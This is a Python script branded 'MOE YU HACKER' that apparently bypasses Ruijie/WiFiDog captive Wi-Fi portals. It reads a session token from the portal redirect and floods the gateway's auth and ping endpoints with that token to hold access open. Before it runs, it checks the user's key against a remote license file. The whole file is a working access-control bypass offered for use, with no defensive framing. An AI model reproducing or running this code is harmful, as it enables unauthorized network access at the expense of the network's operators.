import requests
import re
import urllib3
import time
import threading
import random
import sys
import os
import uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# TERMINAL COLORS
G = "\033[1;92m" 
C = "\033[1;96m" 
R = "\033[1;91m" 
Y = "\033[1;93m" 
W = "\033[0m"

BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", border_style="cyan", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> ACCESS GRANTED!{W}")
            return True
        sys.exit(f"{R}INVALID KEY!{W}")
    except: sys.exit(f"{R}CONNECTION ERROR!{W}")

# ===============================
# FINAL STABLE BYPASS ENGINE
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU FINAL STABLE ENGINE v16.0 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    # Connection Pool ကို တိုးမြှင့်ပြီး Connection ပြတ်မသွားအောင် ထိန်းထားခြင်း
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)

    while True:
        try:
            # Step 1: Internet Status Check
            try:
                check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
                if check.status_code == 204 and "ruijie" not in check.url:
                    sys.stdout.write(f"\r{G}[✓] STATUS: BYPASS STABLE | INTERNET IS OPEN! ✅ {W}")
                    sys.stdout.flush()
                    time.sleep(8)
                    continue
            except: pass

            # Step 2: Token Capture (Redirect URL မှ ဖတ်ခြင်း)
            portal_check = requests.get("http://www.google.com", allow_redirects=True, timeout=5)
            portal_url = portal_check.url
            query = parse_qs(urlparse(portal_url).query)
            
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('sessionId', [None])[0] or 
                   query.get('token', [None])[0])
            
            gw_ip = query.get('gw_address', [None])[0] or urlparse(portal_url).netloc.split(':')[0]
            gw_port = query.get('gw_port', ['2060'])[0]

            if sid:
                console.print(f"\n{Y}[!] Captured SID: {sid[:15]}... | Targeting: {gw_ip}{W}")
                
                # အဓိက Injection Link များ
                auth_url = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                ping_url = f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}"

                def keep_alive_injection():
                    while True:
                        try:
                            # Router ဆီကို Packet တွေ အဆက်မပြတ်ပို့ပြီး Tunnel ကို ဖွင့်ထားခြင်း
                            session.get(auth_url, timeout=2)
                            session.get(ping_url, timeout=2)
                            sys.stdout.write(f"\r{C}[!] Pulse Running: Sending Keep-Alive Packets to {gw_ip}... {W}")
                            sys.stdout.flush()
                        except:
                            # Connection ပြတ်သွားရင် ချက်ချင်းပြန်ချိတ်မယ်
                            time.sleep(0.5)
                        time.sleep(0.1)

                # Thread တစ်ခုတည်းနဲ့ အရင်စမ်းမယ် (Stable ဖြစ်အောင်)
                threading.Thread(target=keep_alive_injection, daemon=True).start()

                # အင်တာနက် စမ်းသပ်ခြင်း
                time.sleep(3)
                console.print(f"\n{G}[✓] Injection Active. Now open Browser and Login!{W}")
                
                # Loop ထဲမှာ ဆက်စောင့်နေမယ်
                while True:
                    time.sleep(10)
                    if "ruijie" in requests.get("http://www.google.com", timeout=5).url:
                        break # အင်တာနက် ပြန်ပိတ်သွားရင် အပြင် Loop ကို ပြန်ထွက်မယ်
            else:
                sys.stdout.write(f"\r{R}[×] Waiting for Portal Redirect... {W}")
                sys.stdout.flush()
                time.sleep(3)

        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
